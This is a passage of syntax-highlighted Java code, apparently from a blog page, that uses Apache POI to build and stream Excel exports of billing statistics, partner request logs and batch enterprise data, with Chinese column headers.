cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                BillingStatisticsDetailMap billingStatisticsDetailMap = list.get(j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsDetailMap.getUserName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsDetailMap.getDataitemUName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsDetailMap.getMonitorEntName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsDetailMap.getSendTime());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            <span class="keyword">if</span> (billingStatisticsDetailMap.getHasContent() == <span class="number">1</span>) &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;有&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;无&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                            <span class="keyword">if</span> (billingStatisticsDetailMap.getSendStatus() == <span class="number">1</span>) &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;正常&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;异常&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsDetailMap.getActualPrice() + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportTotalStatisticsDetail</span><span class="params">(HttpServletResponse response, List&lt;TotalStatisticsMap&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;企业ID&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;企业名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;用户名&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;用户ID&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;数据项名&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;数据编码&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口单价（元）&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;数量&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;总价（元）&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">11</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                TotalStatisticsMap totalStatisticsDetailMap = list.get(j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getEntUid());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getMonitorEntName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getUserName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getUserId());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getDataitemUName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getDynamicDataCode());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getActualPrice() + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getCount());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                            cell.setCellValue(totalStatisticsDetailMap.getTotalPrice() + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">excelTStatisticsEnt</span><span class="params">(HttpServletResponse response, List&lt;TStatisticsEnt&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;指标大类&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;指标小类&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;开始时间&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;结束时间&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;数量&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">8</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            HSSFCellStyle styleBt = workbook.createCellStyle();</span><br><span class="line">            HSSFFont fontBt = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            fontBt.setBold(<span class="keyword">true</span>);</span><br><span class="line">            fontBt.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">10</span>);</span><br><span class="line">            styleBt.setFont(fontBt);</span><br><span class="line">            styleBt.setFillForegroundColor(IndexedColors.SEA_GREEN.getIndex());<span class="comment">//背景</span></span><br><span class="line">            styleBt.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span><br><span class="line"><span class="comment">//            styleBt .setAlignment(HorizontalAlignment.CENTER);</span></span><br><span class="line"><span class="comment">//            styleBt .setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00%&quot;));</span></span><br><span class="line"><span class="comment">//            styleBt.setFillBackgroundColor((short) 59);</span></span><br><span class="line"><span class="comment">//            styleBt.setFillForegroundColor((short) 59);</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line"><span class="comment">//                sheet.setColumnWidth(i, 5000);</span></span><br><span class="line">                sheet.autoSizeColumn(i);</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;</span><br><span class="line">                    sheet.setColumnWidth(i, <span class="number">10000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">2</span> || i == <span class="number">3</span>) &#123;</span><br><span class="line">                    sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(styleBt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                TStatisticsEnt tStatisticsEnt = list.get(j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(tStatisticsEnt.getSupCodeName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            cell.setCellValue(tStatisticsEnt.getSubCodeName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            <span class="keyword">if</span> (tStatisticsEnt.getStartTime() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(simpleDateFormat.format(tStatisticsEnt.getStartTime()));</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            <span class="keyword">if</span> (tStatisticsEnt.getEndTime() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(simpleDateFormat.format(tStatisticsEnt.getEndTime()));</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            cell.setCellValue(tStatisticsEnt.getCount());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportPartnersForNSH</span><span class="params">(HttpServletResponse response, List&lt;PartnersRequestLog&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;客户名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;查询日期&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;查询内容&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;返回内容&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口状态&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">8</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            HSSFCellStyle styleBt = workbook.createCellStyle();</span><br><span class="line">            HSSFFont fontBt = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            fontBt.setBold(<span class="keyword">true</span>);</span><br><span class="line">            fontBt.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">10</span>);</span><br><span class="line">            styleBt.setFont(fontBt);</span><br><span class="line">            styleBt.setFillForegroundColor(IndexedColors.SEA_GREEN.getIndex());<span class="comment">//背景</span></span><br><span class="line">            styleBt.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                sheet.autoSizeColumn(i);</span><br><span class="line"><span class="comment">//                if(i==1)&#123;</span></span><br><span class="line"><span class="comment">//                    sheet.setColumnWidth(i, 10000);</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line"><span class="comment">//                if(i==2||i==3)&#123;</span></span><br><span class="line"><span class="comment">//                    sheet.setColumnWidth(i, 5000);</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(styleBt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                PartnersRequestLog partnersRequestLog = list.get(j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(partnersRequestLog.getPartner());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            cell.setCellValue(partnersRequestLog.getDate());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            String request = partnersRequestLog.getRequest();</span><br><span class="line">                            <span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    JSONObject jsonObject = JSONObject.parseObject(request);</span><br><span class="line">                                    cell.setCellValue(jsonObject.get(<span class="string">&quot;entName&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                    cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            <span class="keyword">if</span> (partnersRequestLog.getResponse() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(partnersRequestLog.getResponse());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            String status = partnersRequestLog.getStatus();</span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotEmpty(status)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="string">&quot;0&quot;</span>.equals(status)) &#123;</span><br><span class="line">                                    cell.setCellValue(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    cell.setCellValue(<span class="string">&quot;异常&quot;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;异常&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">excelBatchNoticeFileData</span><span class="params">(HttpServletResponse response, List&lt;BatchNoticeFileData&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;序号&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;企业名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;统一社会信用代码&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;数据主键&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">15</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;批量数据供给管理&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            HSSFCellStyle styleBt = workbook.createCellStyle();</span><br><span class="line">            HSSFFont fontBt = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            fontBt.setBold(<span class="keyword">true</span>);</span><br><span class="line">            fontBt.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">18</span>);</span><br><span class="line">            styleBt.setFont(fontBt);</span><br><span class="line">            styleBt.setFillForegroundColor(IndexedColors.SEA_GREEN.getIndex());<span class="comment">//背景</span></span><br><span class="line">            styleBt.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span><br><span class="line"><span class="comment">//            styleBt .setAlignment(HorizontalAlignment.CENTER);</span></span><br><span class="line"><span class="comment">//            styleBt .setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00%&quot;));</span></span><br><span class="line"><span class="comment">//            styleBt.setFillBackgroundColor((short) 59);</span></span><br><span class="line"><span class="comment">//            styleBt.setFillForegroundColor((short) 59);</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line"><span class="comment">//                sheet.setColumnWidth(i, 5000);</span></span><br><span class="line">                sheet.autoSizeColumn(i);</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;</span><br><span class="line">                    sheet.setColumnWidth(i, <span class="number">15000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</span><br><span class="line">                    sheet.setColumnWidth(i, <span class="number">10000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">                    sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(styleBt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                BatchNoticeFileData noticeFileData = list.get(j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(j + <span class="number">1</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotBlank(noticeFileData.getEntName())) &#123;</span><br><span class="line">                                cell.setCellValue(noticeFileData.getEntName());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            cell.setCellValue(noticeFileData.getEntName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotBlank(noticeFileData.getEntSocialCode())) &#123;</span><br><span class="line">                                cell.setCellValue(noticeFileData.getEntSocialCode());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            <span class="keyword">if</span> (noticeFileData.getId() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                cell.setCellValue(noticeFileData.getId());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                cell.setCellValue(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span 